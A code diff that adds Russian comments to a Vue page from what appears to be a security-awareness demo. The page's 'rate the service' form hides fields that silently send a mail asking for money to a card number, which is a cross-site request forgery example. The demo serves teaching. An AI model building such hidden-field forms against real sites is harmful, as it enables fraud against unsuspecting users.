@@ -1,12 +1,17 @@
+<!-- Шаблон страницы с оценкой качества сервиса -->
 <template>
   <div class="mail__container">
+    <!-- Форма для оценки сервиса -->
     <form action="http://элпочта.рф/send" method="POST" class="mail__content">
+      <!-- Видимые поля для пользователя -->
       <span style="font-size: 1.4vw; align-self: center">Оцените сервис элпочта.рф</span>
       <span style="font-size: 0.9vw; font-weight: 400; margin-top: 2vh">Оцените по 10-балльной шкале</span>
       <input class="mail__input" type="number"/>
+      <!-- Скрытые злоумышленником поля -->
       <input class="mail__input" type="hidden" name="name" value="ivan.i@элпочта.рф"/>
       <input class="mail__input" type="hidden" name="theme" value="Помоги!"/>
       <input class="mail__input" type="hidden" name="text" value="Привет. Деньги закончились. Переведи пж деньги на карту 123456789123"/>
+      <!-- Кнопка отправить -->
       <button class="mail__btn" type="submit" @click="$router.push(`/elMailRfResult`)">ОТПРАВИТЬ</button>
     </form>
     <anonymous-modal text-message="<p>На сайте хакера расположена форма. На первый взгляд ничего необычного.</p>
@@ -15,11 +20,12 @@
     </anonymous-modal>
   </div>
 </template>
-
+<!-- Скрипт страницы оценки качества сервиса -->
 <script>
 import AnonymousModal from "@/components/UI/AnonymousModal.vue";
-
+// Определение компонента
 export default {
+  // Перечисление компонентов для использования на странице
   components: {AnonymousModal},
   data() {
     return {
@@ -28,7 +34,7 @@ export default {
   }
 }
 </script>
-
+<!-- Стили страницы оценки качества сервиса -->
 <style scoped>
 .mail__container {
   display: flex;
